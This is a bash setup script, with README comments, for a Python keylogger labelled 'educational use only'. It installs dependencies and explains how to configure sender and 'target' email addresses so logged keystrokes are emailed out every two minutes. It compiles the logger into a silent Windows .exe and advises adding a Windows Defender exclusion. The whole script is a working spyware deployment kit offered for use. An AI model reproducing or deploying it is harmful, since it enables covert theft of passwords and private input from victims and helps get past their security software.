# 🖥️ Python Keylogger Setup Script (Educational Use)
# ====================================================
# This script installs all dependencies, helps you compile the keylogger,
# explains usage, and provides guidance for Linux and Windows users.
# ====================================================

# ✨ README INFO INSIDE THIS SCRIPT ✨
# This keylogger logs keystrokes and:
# - Saves them to a file
# - Emails them to your inbox every 2 minutes
# - Can run silently in background
# - Can be compiled into a .exe file for Windows
# ⚠️ EDUCATIONAL PURPOSES ONLY ⚠️

echo "📦 Checking Python version..."
if command -v python3 &>/dev/null; then
    PYTHON="python3"
elif command -v python &>/dev/null; then
    PYTHON="python"
else
    echo "❌ Python is not installed. Please install Python 3 first."
    exit 1
fi

# Install required packages
echo "📦 Installing dependencies..."
$PYTHON -m pip install --upgrade pip
$PYTHON -m pip install -r requirements.txt
echo "✅ Dependencies installed successfully!"

# Guide: How to edit email & timing
echo
echo "🛠️ CONFIGURATION INSTRUCTIONS:"
echo "1. Open keylogger.py"
echo "2. Set your sender email, app password & receiver email:"
echo "      sender = \"youremail@example.com\""
echo "      password = \"your_app_password\""
echo "      receiver = \"targetemail@example.com\""
echo "3. Change time interval if needed:"
echo "      if time.time() - start_time >= 120  # (default is 2 minutes)"
echo

# Build executable
echo "🔧 COMPILING TO .EXE (Windows only)"
echo "Installing pyinstaller..."
$PYTHON -m pip install pyinstaller
echo "Building executable..."
pyinstaller --onefile keylogger.py
echo "✅ Done! Check the dist/ folder for your .exe"

# Run Instructions
echo
echo "💻 USAGE:"
echo "To run on Windows: Run the .exe from dist/"
echo "To run on Linux: Make script executable and run it:"
echo "      chmod +x keylogger.py"
echo "      ./keylogger.py"

# Windows Defender
echo
echo "🐞 TROUBLESHOOTING:"
echo "Windows Defender may flag the executable. Add an exclusion if needed."

# Ending
echo
echo "✅ All set up! This script included README, install, build, and usage!"
echo "💡 Tip: You can now customize, test, and deploy as you like."
